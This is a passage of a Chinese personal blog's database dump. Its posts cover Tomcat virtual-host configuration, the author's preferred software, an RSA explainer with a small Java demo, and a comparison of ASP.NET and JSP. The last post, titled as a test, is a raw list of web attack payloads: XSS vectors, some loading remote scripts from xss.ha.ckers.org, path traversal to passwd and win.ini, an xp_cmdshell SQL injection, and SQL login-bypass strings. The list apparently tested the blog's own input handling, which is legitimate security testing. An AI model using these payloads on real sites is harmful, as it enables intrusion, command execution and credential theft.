json-lib-2.1-jdk15 json包\r\n* ezmorph-1.0.3		json辅助包\r\n\r\n### preview - 预览\r\n>原作者的成品网站示例:\r\n\r\n[www.openidea.xin](http://www.openidea.xin)\r\n\r\n',2031),(79,'Tomcat虚拟化系列之多Host配置','2018-02-22 11:51:00',0,0,6,'    Tomcat创建多个虚拟主机，只需要修改server.xml，添加多个的Host，指定不同的name即可。\r\n\r\nTomcat的server.xml文件Host内容解析：\r\n```\r\n\r\n《Host name=\"localhost\"  appBase=\"webapps\"\r\n            unpackWARs=\"true\" autoDeploy=\"true\"》\r\n《!-- SingleSignOn valve, share authentication between web applications\r\n             Documentation at: /docs/config/valve.html --》\r\n 《!--\r\n《Valve className=\"org.apache.catalina.authenticator.SingleSignOn\" /》\r\n        --》\r\n《!-- Access log processes all example.\r\n             Documentation at: /docs/config/valve.html\r\n             Note: The pattern used is equivalent to using pattern=\"common\" --》\r\n《Valve className=\"org.apache.catalina.valves.AccessLogValve\" directory=\"logs\"\r\n               prefix=\"localhost_access_log.\" suffix=\".txt\"\r\n               pattern=\"%h %l %u %t \"%r\" %s %b\" /》\r\n 《/Host》\r\n在server.xml中使用《Host》标签包裹，其中Host标签的元素有：\r\n\r\n     name  ： 指出这个虚拟主机的名字，可以使域名。\r\n\r\n     appBase ： 如果要war文件自动部署的话指定这个目录，这个目录下的war文件会被自动部署。\r\n\r\n    unpackWARs : 是否对appBase指定的目录下的war文件自动解压，true为自动解压，false为不自动解压，直接运行war文件。\r\n\r\n    autoDeploy：设置是否在tomcat运行期间自动更新项目（包括在appBase添加新的项目，修改，删除，更新），true时，会自动更新appBase下的war项目，web.xml文件的更改，以及Host下指定《Context》 标签定制的项目（在appBase下的）。\r\n```\r\n（http://tomcat.apache.org/tomcat-7.0-doc/deployer-howto.html#Deploying_on_a_running_Tomcat_server）\r\n\r\n\r\n在Host标签中，还可以添加子标签:\r\n```\r\n《Alias》域名《/Alias》\r\n\r\n指定域名，可设置多个。支持正则.\r\n\r\n《Context path=\"\"  docBase=\"/www/a.war\"  reloadable=\"true\" /》\r\n\r\ncontext标签是用来指定自定义的网站的url，以及映射实际的在系统的物理路径。\r\n\r\n例如：《Context path=\"/abc\"  docBase=\"/www/a.war\"  reloadable=\"true\" /》时，我们访问www.xxx.com/abc代替www.xxx.com/a。\r\n```\r\n    path  ：是要重命名后的路径，用/代表根路径，例如/abc\r\n\r\n    docBase： 是指定war的真实的物理路径，可以不在appBase下。\r\n\r\n    reloadable：为true时会自动更新，context指定的应用。\r\n\r\n\r\n关于appBase和docBase路径的区别和关系：\r\n\r\n    appBase：是可以自动部署war的路径，默认是在tomcat的安装路径下的webapps，如果                       用tomcat的默认的话使用相对路径，也可以使用绝对路径指定一个非tomcat默认的路径。\r\n\r\n    docBase：与appBase没什么直接关系，它指出特定的应用的单独设置。如果war包在                            appbase下，可以使用相对路径，比如在appBase路径下有，a.war,设置                                docBase时可以用a来设置。常用使用绝对路径定义。\r\n\r\n\r\n标签：Valve：\r\n\r\n设置Host的访问日志\r\n\r\n    classname ： 设置使用哪个类来处理tomcat的访问日志\r\n\r\n    directory ： 设置log日志的存放路径，默认log是在tomcat的安装路径下logs目录下\r\n\r\n    prefix ： 指定访问日志的前缀，也可以理解为名字。\r\n\r\n    suffix ： 指定访问日志的后缀，可以理解为扩展名。\r\n\r\n    pattern ： 为日志的记录格式。\r\n\r\n\r\n###总结\r\n虚拟主机,虚拟路径,以及虚拟端口号的映射是url映射的三大难点,只有合理配置这些映射关系,才能使你的网站更安全,更易于管理',2311),(80,'我常用的应用软件和服务','2018-02-23 20:52:35',6,2,15,'>强迫症总要使用最主流的软件,下面是我最常使用的工具列表，放出来和大家共享，为的是获取最新最好的软件服务\r\n\r\n---\r\n####浏览器\r\n- Chrome\r\n- Firefox\r\n\r\n除了做渗透测试,selenium自动化时用到火狐,基本只用Chrome,哦对了,有时候用招商银行网银的时候还得忍痛转IE....\r\n####中文输入法\r\n- 搜狗拼音\r\n\r\n没得商量,输入习惯已经被计入骨髓,离不开了\r\n####搜索引擎\r\n- 百度/bing\r\n- google\r\n\r\n没啥可说的,俩都用,方便的那个不靠谱,靠谱的那个不方便\r\n\r\n####音乐软件\r\n- 网易云\r\n\r\n云村的日推还是不错滴~\r\n####办公套件\r\n- 金山\r\n\r\n其实ms office用的很少了,在linux下也会使用wps,支持国货\r\n\r\n####字体\r\n- 幼圆\r\n- serif\r\n- cursive\r\n\r\n中文首选幼圆,其他都是辣鸡~\r\n\r\n####社交\r\n- 微信\r\n\r\n微信是用来谈正经事的\r\n####娱乐\r\n- 微博\r\n- b站\r\n- lofter\r\n- facebook\r\n- Instagram\r\n\r\n对,fb对我来说是玩的东西\r\n####游戏\r\n- steam\r\n\r\n最近年纪大了,不怎么玩了\r\n\r\n####云笔记\r\n- 有道云\r\n- 印象笔记\r\n\r\n现在用的不算太多,以后步入职场应该会常用\r\n\r\n####即时翻译\r\n- 海词(dict.cn)\r\n- 谷歌翻译(translate.google.com)\r\n\r\n####多媒体\r\n- Photoshop\r\n- GoldWave\r\n\r\n我是专业的\r\n####支付\r\n- 支付宝\r\n\r\n这也没的说,偏爱支付宝\r\n\r\n####网盘\r\n- 百度云\r\n- 微云\r\n\r\n不知道算不算云计算产品?\r\n\r\n####职业社交\r\n- LinkedIn\r\n\r\n然而并没有抱太大希望于在这上面找工作\r\n\r\n####技术网站\r\n- github\r\n- csdn\r\n- Stack Overflow\r\n- 云栖社区\r\n- 开源中国\r\n\r\n最爱的就是精心维护账号\r\n\r\n####linux版本\r\n- ubuntu\r\n- deepin\r\n- kali\r\n- centos\r\n\r\n还是喜欢即装即用的发行版,centos主要用于vps\r\n\r\n####vps\r\n- 阿里云\r\n\r\n只用过阿里云,不然多了不划算...\r\n\r\n####f翻q樯\r\n- shadowsocks\r\n\r\n之前用stunnel+squid结果还是被墙了,最后发现SS伪装效果最好\r\n\r\n####开发工具\r\n- eclipse\r\n- visual studio\r\n- git\r\n- filezilla\r\n- putty\r\n- vscode\r\n- atom\r\n\r\n太多了,不一一列举了\r\n####虚拟机环境\r\n- vmware workstation\r\n- virtual box\r\n\r\n各有优劣\r\n####爬虫\r\n- selenium\r\n- postman\r\n\r\n驱动器环境是java或者python\r\n\r\n####shell工具\r\n- bash\r\n- vim\r\n- nmap\r\n- crond\r\n- Burp Suite\r\n- grep/awk/sed\r\n\r\n太多了不说了\r\n\r\n---\r\n>以上就是我一时能想到的,对于很nice的Internet账户就会像网游账号一样精心维护,你们日常开发和生活中还会用到什么工具,欢迎在底下留言~',1455),(81,'RSA算法的个人理解','2018-02-26 10:51:36',5,1,13,'#不对称加密算法RSA浅析\r\n\r\n#####搬家于2018-02-26\r\n       本文主要介绍不对称加密算法中最精炼的RSA算法。我们先说结论，也就是RSA算法怎么算，然后再讲为什么。\r\n\r\n       随便选取两个不同的大素数p和q，N=p*q，r=（p-1）*（q-1）。\r\n\r\n       算出一组（e，d）满足e*d≡1（mod r）。\r\n\r\n       设明文x，密文y，x和y都小于N：\r\n\r\n       加密：xe ≡ y (mod N)；解密：yd ≡ x (mod N)。\r\n\r\n       以前也接触过RSA加密算法，感觉这个东西太神秘了，是数学家的事，和我无关。但是，看了很多关于RSA加密算法原理的资料之后，我发现其实原理并不是我们想象中那么复杂，弄懂之后发现原来就只是这样而已..\r\n\r\n       RSA算法的主要用途如下：\r\n\r\n       1.数据加密\r\n\r\n       2.不对称秘钥解密\r\n\r\n       3.保证数据完整性\r\n\r\n       4.验证发送者\r\n\r\n　　学过算法的朋友都知道，计算机中的算法其实就是数学运算。所以，在讲解RSA加密算法之前，有必要了解一下一些必备的数学知识。我们就从离散数学开始讲解，有一定基础的同学直接跳到下一节甚至直接看代码部分就行了。\r\n\r\n　　RSA加密算法中，只用到素数、互质数、指数运算、模运算等几个简单的数学知识。所以，我们也需要了解这几个概念即可。\r\n\r\n素数\r\n\r\n　　素数又称质数，指在一个大于1的自然数中，除了1和此整数自身外，不能被其他自然数整除的数。这个概念，我们在上初中，甚至小学的时候都学过了，这里就不再过多解释了。\r\n\r\n互质数\r\n\r\n　　百度百科上的解释是：公因数只有1的两个数，叫做互质数。；维基百科上的解释是：互质，又称互素。若N个整数的最大公因子是1，则称这N个整数互质。\r\n\r\n　　常见的互质数判断方法主要有以下几种：\r\n\r\n1 较小数是质数，较大数不为它的倍数。如3与10。\r\n\r\n2 相邻的两个自然数是互质数。如 15与 16。\r\n\r\n3 相邻的两个奇数是互质数。如 49与 51。\r\n\r\n4 较大数是质数的两个数是互质数。如97与88。\r\n\r\n5 辗转相除法判断。\r\n\r\n指数运算\r\n\r\n　　指数运算又称乘方计算，计算结果称为幂。nm指将n自乘m次。把nm看作乘方的结果，叫做”n的m次幂”或”n的m次方”。其中，n称为“底数”，m称为“指数”。\r\n\r\n模运算！！非常重要，不懂请自学！\r\n\r\n　　模运算即求余运算。“模”是“Mod”的音译。和模运算紧密相关的一个概念是“同余”。数学上，当两个整数除以同一个正整数，若得相同余数，则二整数同余。\r\n\r\n　　两个整数a，b，若它们除以正整数m所得的余数相等，则称a，b对于模m同余，记作: a ≡ b (mod m)；读作：a同余于b模m，或者，a与b关于模m同余。例如：26 ≡ 14 (mod 12)。\r\n\r\n\r\n\r\n对称与非对称秘钥的区别\r\n\r\n       传统的加密算法都使用对称秘钥，即加密和解密都使用同一把秘钥，有的人还会混淆其与文件夹加密或者锁屏密码，这里不妨说一下，电脑上的文件夹加密和手机上的屏幕解锁密码都是应用在用户界面上的一层密码防护，并没有将文件内容重新排列组合，即使忘记密码也能通过操作系统的API接口访问内部数据，就好比把机密文件藏在保险箱里，盗贼只要敲开箱子就能看到文件信息，说白了就是防外行人的。而算法加密就是将机密文件信息翻译成火星文（内定的语言），即使卧底发现了它也看不懂。\r\n\r\n       对称加密算法具体表现成：y=f（x）；x=f -1（y）。举个栗子，将明文中的每个字符都替换成它在Unicode或Ascall码中的下一个字符，这是一种很简单的加密算法，接收者收到密文还真的很难想到是如此“幼稚”的排列组合。但是一旦这个算法f泄露了，第三方很容易就能推算出它的逆变换f -1，所以对称加密算法某种程度上不安全。\r\n\r\n       那么什么是不对称加密算法呢？就是：就算告诉你了加密规则，你一时半会也想不出它对应了解密规则。我刚接触这个理论觉得很神奇，甚至不相信数学世界中会存在这种“不可逆”的算法，但是一个简单的例子就让我信服了：\r\n\r\n       一个33以下的整数x，将它变成另一个数y=x3(mod 33）即x3除以33取得的余数，我当时无论如何也想不到y怎样再变回x。这就是RSA算法的神奇之处，想知道它的解法吗？\r\n\r\n\r\n\r\n\r\n\r\nRSA加密算法简史\r\n\r\n　　RSA是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。当时他们三人都在麻省理工学院工作。RSA就是他们三人姓氏开头字母拼在一起组成的。\r\n\r\n公钥与密钥的产生\r\n\r\n　　假设Alice想要通过一个不可靠的媒体接收Bob的一条私人讯息。她可以用以下的方式来产生一个公钥和一个私钥：\r\n```\r\n1 随意选择两个大的质数p和q，p不等于q，计算N=pq，此时N的非1因数只有p和q，证略。\r\n\r\n2 根据欧拉函数，求得r=φ（pq）= (p-1)(q-1)，证略。\r\n\r\n3 选择一个小于 r 的整数 e（encrypt），求得 e 关于模 r 的模反元素，命名为d（decrypt），也就是满足e*d≡1（mod r）。此时e和d关于等式对称，关于模r互逆互质。\r\n\r\n4 将 p 和 q 的记录销毁。\r\n\r\n5    (N,e)是公钥，(N,d)是私钥。Alice将她的公钥(N,e)传给Bob，而            将自己的私钥(N,d)藏起来。\r\n```\r\n加密消息\r\n\r\n　　假设Bob想给Alice送一个消息X，他知道Alice产生的N和e。他使用起先与Alice约好的格式将X转换为一个小于N的整数x，比如他可以将每一个字转换为这个字的Unicode码，然后将这些数字连在一起组成一个数字。假如他的信息非常长的话，他可以将这个信息分为若干段，然后将每一段转换为x。用下面这个公式他可以将x加密为余数y：\r\n\r\n　　xe ≡ y (mod N)\r\n\r\n计算y并不复杂。Bob算出y后就可以将它传递给Alice。\r\n\r\n解密消息\r\n\r\nAlice得到Bob的消息y后就可以利用她的密钥d来解码。她可以用以下这个公式来将y转换为x：\r\n\r\n　　yd ≡ x (mod N)\r\n\r\n这样就得到的余数x就是原来的明文x，她可以将原来的信息X重新复原。\r\n\r\n解码的原理\r\n\r\n（证明解密等式成立即可）\r\n\r\n　　由加密算法推得yd ≡ x e·d(mod N)\r\n\r\n以及ed ≡ 1 (mod p-1)和ed ≡ 1 (mod q-1)。由费马小定理可证明\r\n\r\n　　xe·d ≡ x (mod p) 　　和 　x e·d ≡ x (mod q)\r\n\r\n       xe·d ≡ x (mod pq)\r\n\r\n不过说实话，算法的证明需要引用欧拉、费马老人家的定理比较繁琐，即使看懂了也没有太多的成就感所以读者可以选择直接记住它的结论。\r\n\r\n签名消息\r\n\r\n　　RSA也可以用于数字签名和完整性保护。假如甲想给乙传递一个署名的消息的话，那么她可以为她的消息计算一个散列值(Message digest)，然后用她的密钥(private key)加密这个散列值并将这个“署名”加在消息的后面。这个消息只有用她的公钥才能被解密，此处可以看出公钥e和私钥d是可以互换使用的，即公式上的”对称“。乙获得这个消息后可以用甲的公钥解密这个散列值，然后将这个数据与他自己为这个消息计算的散列值相比较。假如两者相符的话，那么他就可以知道发信人持有甲的密钥，反之如果不符那么这个消息既可能被篡改也可能来自第三方的“坏人”。\r\n\r\n编程实践\r\n\r\n　　下面，开始我们的重点环节：编程实践。在开始编程前，我们通过计算，来确定公钥和密钥。\r\n\r\n计算公钥和密钥\r\n\r\n1 假设p = 3、q = 11（解决之前的伏笔~），则N = pq = 33；\r\n\r\n2 r = (p-1)(q-1) = (3-1)(11-1) = 20；\r\n\r\n3 根据模反元素的计算公式，我们可以得出，e·d ≡ 1 (mod 20),即e·d = 20n+1 (n为正整数)；我们假设n=1，则e·d = 21。e、d为正整数，并且e与r互质，则e = 3，d = 7。（两个数交换一下也可以。）\r\n\r\n　　到这里，公钥和密钥已经确定。公钥为(N, e) = (33, 3)，密钥为(N, d) = (33, 7)。\r\n\r\n编程实现\r\n\r\n\r\n\r\n　　下面我们使用Java来实现一下加密和解密的过程。具体代码如下：\r\n```\r\n1 \"font-size:14px;\">package security.rsa;  \r\n\r\n2\r\n\r\n3 publicclass RSA {  \r\n\r\n4\r\n\r\n5\r\n\r\n11 publicstaticlong rsa(int baseNum, int key, long message){  \r\n\r\n12 if(baseNum < 1 || key < 1){  \r\n\r\n13 return 0L;  \r\n\r\n14         }  \r\n\r\n15 //加密或者解密之后的数据\r\n\r\n16 long rsaMessage = 0L;  \r\n\r\n17\r\n\r\n18 //加密核心算法\r\n\r\n19         rsaMessage = Math.round(Math.pow(message, key)) % baseNum;  \r\n\r\n20 return rsaMessage;  \r\n\r\n21     }  \r\n\r\n22\r\n\r\n23\r\n\r\n24\r\n\r\n25 publicstaticvoid main(String[] args){  \r\n\r\n26 //基数\r\n\r\n27 int baseNum = 3 * 11;  \r\n\r\n28 //公钥\r\n\r\n29 int keyE = 3;  \r\n\r\n30 //密钥\r\n\r\n31 int keyD = 7;  \r\n\r\n32 //未加密的数据\r\n\r\n33 long msg = 24L;  \r\n\r\n34 //加密后的数据\r\n\r\n35 long encodeMsg = rsa(baseNum, keyE, msg);  \r\n\r\n36 //解密后的数据\r\n\r\n37 long decodeMsg = rsa(baseNum, keyD, encodeMsg);  \r\n\r\n38\r\n\r\n39         System.out.println(\"加密前：\" + msg);  \r\n\r\n40         System.out.println(\"加密后：\" + encodeMsg);  \r\n\r\n41         System.out.println(\"解密后：\" + decodeMsg);  \r\n\r\n42\r\n\r\n43     }  \r\n\r\n44       \r\n\r\n45\r\n\r\n46 }  \r\n```\r\nRSA算法结果：\r\n\r\n>加密前：24\r\n\r\n>加密后：30\r\n\r\n>解密后：24\r\n\r\n\r\n\r\n（看程序最清楚了，对于要加密的数字x, xe%N=y, y就是加密之后的密文。yd%N=x, 就能解密得到x）\r\n\r\n\r\n\r\nRSA加密算法的安全性\r\n\r\n　　当p和q是一个大素数的时候，从它们的积pq去分解因子p和q，这是一个公认的数学难题。然而，虽然RSA的安全性依赖于大数的因子分解，但并没有从理论上证明破译RSA的难度与大数分解难度等价。\r\n\r\n　　1994年彼得·秀尔（Peter Shor）证明一台量子计算机可以在多项式时间内进行因数分解。假如量子计算机有朝一日可以成为一种可行的技术的话，那么秀尔的算法可以淘汰RSA和相关的衍生算法。（即依赖于分解大整数困难性的加密算法）\r\n\r\n　　另外，假如N的长度小于或等于256位（二进制位），那么用一台个人电脑在几个小时内就可以分解它的因子了。1999年，数百台电脑合作分解了一个512位长的N。1997年后开发的系统，用户应使用1024位密钥，证书认证机构应用2048位或以上。\r\n\r\nRSA加密算法的缺点\r\n\r\n　　虽然RSA加密算法作为目前最优秀的公钥方案之一，在发表三十多年的时间里，经历了各种攻击的考验，逐渐为人们接受。但是，也不是说RSA没有任何缺点。由于没有从理论上证明破译RSA的难度与大数分解难度的等价性。所以，RSA的重大缺陷是无法从理论上把握它的保密性能如何。在实践上，RSA也有一些缺点：\r\n\r\n>1 产生密钥很麻烦，受到素数产生技术的限制，因而难以做到一次一密；\r\n\r\n>2 分组长度太大，为保证安全性，n 至少也要 600 bits 以上，使运算代价很高，尤其是速度较慢（比对称加密算法慢1000倍以上）。\r\n\r\n\r\n\r\n以上就是RSA算法的全部内容以及尽可能多的个人理解，若有偏差请自行改正，疑问请留言qq2195868682。',5442),(82,'asp.NET与JavaEE两大阵营对比','2018-03-01 19:57:53',2,2,8,'##1 各自的HelloWord版本\r\n1.1 ASP\r\n《%\r\n Response.Write(\"hello asp\")\r\n%》\r\n\r\n文件名为test.asp。\r\n\r\n1.2 ASP.net\r\n《%@ page Language=\"C#\" %》\r\n《%\r\n Response.Write(\"hello asp.net\");\r\n%》\r\n\r\n文件名为test.aspx。\r\n\r\n需要注意的是由于ASP.net支持多种语言开发，而默认的语言是VB.net，这里使用的是C#语言，所以必须对其进行明确控制。否则编译时会按照VB.net进行，从而报错！\r\n\r\n1.3 JSP\r\n《%\r\n    out.println(\"hello jsp\");\r\n%》\r\n\r\n文件名为 test.jsp\r\n\r\n1.4 分析\r\nasp,aspx,jsp都采用了相同的嵌入语法《%代码%》，都内置了用于输出文本的对象，ASP-Response，ASP.net-Response, JSP-out。\r\n\r\n对于语言来讲，VBScript不区分大小写，而C#和Java都区分；\r\n\r\n对于命名习惯，VBScript和C#的类、属性、方法首字母都大写，而Java除了类其它的统统都习惯以小写字母开头。\r\n\r\n##2 基本语法\r\n2.1 嵌入表达式\r\n（1）ASP\r\n\r\n《%= %》\r\n\r\n（2）ASP.net\r\n\r\n《%= %》\r\n\r\n（3）JSP\r\n\r\n《%= %》\r\n\r\n可见，三者完全相同。\r\n\r\n2.2 嵌入声明\r\n（1）ASP\r\n\r\n《script Language=\"VBScript\" runat=\"server》\r\n\r\n sub f\r\n      Response.Write(\"hello asp from script\")\r\n end sub\r\n\r\n《/script》\r\n\r\n（2）ASP.net\r\n\r\n《script Language=\"C#\" runat=\"server\"》\r\n\r\nvoid f()\r\n\r\n{\r\n\r\n    Response.Write(\"asp.net from script\");\r\n\r\n}\r\n\r\n《/script》\r\n\r\n（3）JSP\r\n\r\n《%!\r\n\r\n   public void f()\r\n\r\n  {\r\n\r\n       out.println(\"jsp \");\r\n\r\n  }\r\n\r\n%》\r\n\r\n可见，ASP和ASP.net使用的语法相同，而JSP不一样。\r\n\r\n2.4 嵌入程序片段\r\n（1）ASP\r\n\r\n《%程序片段%》\r\n\r\n（2）ASP.net\r\n\r\n《%程序片段%》\r\n\r\n（3）JSP\r\n\r\n《%程序片段%》\r\n\r\n可见三者的语法完全一样。\r\n\r\n##3 内置对象\r\n3.1 ASP\r\n（1）Request对象\r\n\r\n代表了客户端发送到服务器端的信息。携带了如用户端浏览器信息、请求字符串、表单数据、cookies等。\r\n\r\n（2）Response对象\r\n\r\n代表了服务器端返回到客户端的相关内容与操作，可以通过它设置返回内容，返回cookie设置，是否缓存等。\r\n\r\n（3）Application对象\r\n\r\n代表了整个应用，是应用范围内的变量。多个页面共享它，所以会涉及到并发访问的问题，所以提供了Lock和Unlock方法进行同步处理。\r\n\r\n（4）Session对象\r\n\r\n代表了一个会话，会话有一个唯一的ID标识，客户端一般通过cookie或者请求字符串来提供会话的标识。\r\n\r\n（5）Server对象\r\n\r\n代表了服务器端的环境，提供了注册组件、映射路径等基本操作。\r\n\r\n（6）ObjectContext对象\r\n\r\n用于控制ASP的事务处理，编程时很少直接用到。\r\n\r\n3.2 ASP.net\r\n（1）Request对象\r\n\r\n作用与ASP中的Request相同。\r\n\r\n（2）Response对象\r\n\r\n作用与ASP中的Request相同。\r\n\r\n（3）Application对象\r\n\r\n作用与ASP中的Application相同。\r\n\r\n（4）Session对象\r\n\r\n作用与ASP中的Session相同。\r\n\r\n（5）Server对象\r\n\r\n作用与ASP中的Session相同。\r\n\r\n（6）Page对象\r\n\r\n代表当前的页面，或者编译后的类。\r\n\r\n3.3 JSP\r\n（1）request对象\r\n\r\n作用与ASP，ASP.net中的Request相同，JSP里是小写。\r\n\r\n（2）response对象\r\n\r\n作用与ASP,ASP.net中的Response类似，JSP里是小写。\r\n\r\n（3）application对象\r\n\r\n作用与ASP,ASP.net中的Application相同，JSP里是小写。\r\n\r\n（4）session对象\r\n\r\n作用与ASP,ASP.net中的Session相同，JSP里是小写。\r\n\r\n（5）out对象\r\n\r\n实现向客户端的输出，作用类似ASP,ASP.net中的Response.Write()。\r\n\r\n（6）page对象\r\n\r\n代表当前页面，或者编译后的Servlet。\r\n\r\n##4 数据库访问使用的对象\r\n4.1 ASP\r\nASP采用了ADO技术访问数据库。\r\n\r\n（1）Connection类\r\n\r\n代表了一个数据库管理系统的连接。\r\n\r\nSet conn = Server.CreateObject(\"ADODB.Connection\")\r\n\r\n（2）Command类\r\n\r\n对连接好的数据库执行命令。\r\n\r\n（3）RecordSet类\r\n\r\n记录集。\r\n\r\nSet rs = Server.CreateObject(\"ADODB.Recordset\")\r\n\r\n（4）Field类\r\n\r\n（5）Parameter类\r\n\r\n（6）Property类\r\n\r\n（7）Error类\r\n\r\n4.2 ASP.net\r\nASP.net采用ADO.net技术访问数据库。\r\n\r\n（1）SqlConnection\r\n\r\n与ASP中的Connection一样。\r\n\r\n（2）SqlCommand\r\n\r\n与ASP中的Command一样。\r\n\r\n（3）DataSet\r\n\r\n与ASP中的RecordSet类似。\r\n\r\n4.3 JSP\r\nJSP采用了JDBC技术来访问数据库。\r\n\r\n（1）Connection类\r\n\r\n负责数据库的 连接。\r\n\r\n（2）Statemaent类\r\n\r\n类似于ASP中的Command，负责SQL语句的执行。\r\n\r\n（3）ResultSet\r\n\r\n结果集，类似于ASP的RecordSet，以及ASP.net的DataSet。\r\n\r\n##5 结论\r\n通过分析比较可以看出ASP,ASP.net,JSP有着非常多的共同点，都是对Http以及SQL数据库处理的规范化与流程化，其设计思路完全一致，只是技术实现存在细节差异。\r\n\r\n尽管各自的开发环境、编码规范等等也存在不小的差异，但是由于其设计理念和处理流程极其类似，所以一个项目一开始往往只有一个版本，一旦后来发展的 比较好，就会陆续推出其他平台的版本，比如discuz最早就是PHP开发的，后来有了ASP.net的版本。同样一个程序员如果真正掌握了任何一种平 台，其开发经验90%都可以用到其他平台上，很多程序员在ASP.net和JSP之间转换只需要2周时间，这并不奇怪。',3063),(83,'我是测试3','2018-03-04 17:49:07',0,1,6,'`》《script》alert(document.cookie)《|script》\r\n=`》《script》alert(document.cookie)《|script》\r\n《script》alert(document.cookie)《|script》\r\n《script》alert(vulnerable)《|script》\r\n%3Cscript%3Ealert(`XSS`)%3C|script%3E\r\n《script》alert(`XSS`)《|script》\r\n《img src=``javascript:alert(`XSS`)``》\r\n%0a%0a《script》alert(\\``Vulnerable\\``)《|script》.jsp\r\n%22%3cscript%3ealert(%22xss%22)%3c|script%3e\r\n%2e%2e|%2e%2e|%2e%2e|%2e%2e|%2e%2e|%2e%2e|%2e%2e|etc|passwd\r\n%2E%2E|%2E%2E|%2E%2E|%2E%2E|%2E%2E|windows|win.ini\r\n%3c|a%3e%3cscript%3ealert(%22xss%22)%3c|script%3e\r\n%3c|title%3e%3cscript%3ealert(%22xss%22)%3c|script%3e\r\n%3cscript%3ealert(%22xss%22)%3c|script%3e|index.html\r\n%3f.jsp\r\n%3f.jsp\r\n《script》alert(`Vulnerable`);《|script》\r\n《script》alert(`Vulnerable`)《|script》\r\n?sql_debug=1\r\na%5c.aspx\r\na.jsp|《script》alert(`Vulnerable`)《|script》\r\na|\r\na?《script》alert(`Vulnerable`)《|script》\r\n``》《script》alert(`Vulnerable`)《|script》\r\n`;exec%20master..xp_cmdshell%20`dir%20 c:%20》%20c:\\inetpub\\wwwroot\\?.txt`--##\r\n%22%3E%3Cscript%3Ealert(document.cookie)%3C|script%3E\r\n%3Cscript%3Ealert(document. domain);%3C|script%3E#\r\n%3Cscript%3Ealert(document.domain);%3C|script%3E#SESSION_ID={SESSION_ID}#SESSION_ID=\r\n1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname=\r\nhttp:||www.cnblogs.com|http:||www.cnblogs.com|http:||www.cnblogs.com|http:||www.cnblogs.com|etc|passwd\r\n..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini\r\n\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini\r\n``;!--``《XSS》=#{()}\r\n《IMG src=``javascript:alert(`XSS`);``》\r\n《IMG src=javascript:alert(`XSS`)》\r\n《IMG src=JaVaScRiPt:alert(`XSS`)》\r\n《IMG src=JaVaScRiPt:alert(``XSS``)》\r\n《IMG src=javascript:alert(`XSS`)》\r\n《IMG src=javascript:alert(`XSS`)》\r\n《IMG src=##x6A##x61##x76##x61##x73##x63##x72##x69##x70##x74##x3A##x61##x6C##x65##x72##x74##x28##x27##x58##x53##x53##x27##x29》\r\n《IMG src=``jav ascript:alert(`XSS`);``》\r\n《IMG src=``jav ascript:alert(`XSS`);``》\r\n《IMG src=``jav ascript:alert(`XSS`);``》\r\n``《IMG src=java\\0script:alert(\\``XSS\\``)》``;` 》 out\r\n《IMG src=`` javascript:alert(`XSS`);``》\r\n《SCRIPT》a=|XSS|alert(a.source)《|SCRIPT》\r\n《BODY BACKGROUND=``javascript:alert(`XSS`)``》\r\n《BODY ONLOAD=alert(`XSS`)》\r\n《IMG DYNSRC=``javascript:alert(`XSS`)``》\r\n《IMG LOWSRC=``javascript:alert(`XSS`)``》\r\n《BGSOUND src=``javascript:alert(`XSS`);``》\r\n《br size=``#{alert(`XSS`)}``》\r\n《LAYER src=``http:||xss.ha.ckers.org|a.js``》《|layer》\r\n《LINK REL=``stylesheet`` href=``javascript:alert(`XSS`);``》\r\n《IMG src=`vbscript:msgbox(``XSS``)`》\r\n《IMG src=``mocha:[code]``》\r\n《IMG src=``livescript:[code]``》\r\n《META HTTP-EQUIV=``refresh`` CONTENT=``0;url=javascript:alert(`XSS`);``》\r\n《IFRAME src=javascript:alert(`XSS`)》《|IFRAME》\r\n《FRAMESET》《FRAME src=javascript:alert(`XSS`)》《|FRAME》《|FRAMESET》\r\n《TABLE BACKGROUND=``javascript:alert(`XSS`)``》\r\n《DIV STYLE=``background-image: url(javascript:alert(`XSS`))``》\r\n《DIV STYLE=``behaviour: url(`http:||www.how-to-hack.org|exploit.html`);``》\r\n《DIV STYLE=``width: expression(alert(`XSS`));``》\r\n《STYLE》@im\\port`\\ja\\vasc\\ript:alert(``XSS``)`;《|STYLE》\r\n《IMG STYLE=`xss:expre\\ssion(alert(``XSS``))`》\r\n《STYLE TYPE=``text|javascript``》alert(`XSS`);《|STYLE》\r\n《STYLE TYPE=``text|css``》.XSS{background-image:url(``javascript:alert(`XSS`)``);}《|STYLE》《A class=``XSS``》《|A》\r\n《STYLE type=``text|css``》BODY{background:url(``javascript:alert(`XSS`)``)}《|STYLE》\r\n《BASE href=``javascript:alert(`XSS`);||``》\r\ngetURL(``javascript:alert(`XSS`)``)\r\na=``get``;b=``URL``;c=``javascript:``;d=``alert(`XSS`);``;eval(a+b+c+d);\r\n《XML src=``javascript:alert(`XSS`);``》\r\n``》 《BODY ONLOAD=``a();``》《SCRIPT》function a(){alert(`XSS`);}《|SCRIPT》《``\r\n《SCRIPT src=``http:||xss.ha.ckers.org|xss.jpg``》《|SCRIPT》\r\n《IMG src=``javascript:alert(`XSS`)``\r\n《!--#exec cmd=``|bin|echo `《SCRIPT SRC```--》《!--#exec cmd=``|bin|echo `=http:||xss.ha.ckers.org|a.js》《|SCRIPT》```--》\r\n《IMG src=``http:||www.thesiteyouareon.com|somecommand.php?somevariables=maliciouscode``》\r\n《SCRIPT a=``》`` src=``http:||xss.ha.ckers.org|a.js``》《|SCRIPT》\r\n《SCRIPT =``》`` src=``http:||xss.ha.ckers.org|a.js``》《|SCRIPT》\r\n《SCRIPT a=``》`` `` src=``http:||xss.ha.ckers.org|a.js``》《|SCRIPT》\r\n《SCRIPT ``a=`》``` src=``http:||xss.ha.ckers.org|a.js``》《|SCRIPT》\r\n《SCRIPT》document.write(``《SCRI``);《|SCRIPT》PT src=``http:||xss.ha.ckers.org|a.js``》《|SCRIPT》\r\n《A href=http:||www.gohttp:||www.google.com|ogle.com|》link《|A》\r\nadmin`--\r\n` or 0=0 --\r\n`` or 0=0 --\r\nor 0=0 --\r\n` or 0=0 #\r\n`` or 0=0 #\r\nor 0=0 #\r\n` or `x`=`x\r\n`` or ``x``=``x\r\n`) or (`x`=`x\r\n` or 1=1--\r\n`` or 1=1--\r\nor 1=1--\r\n` or a=a--\r\n`` or ``a``=``a\r\n`) or (`a`=`a\r\n``) or (``a``=``a\r\nhi`` or 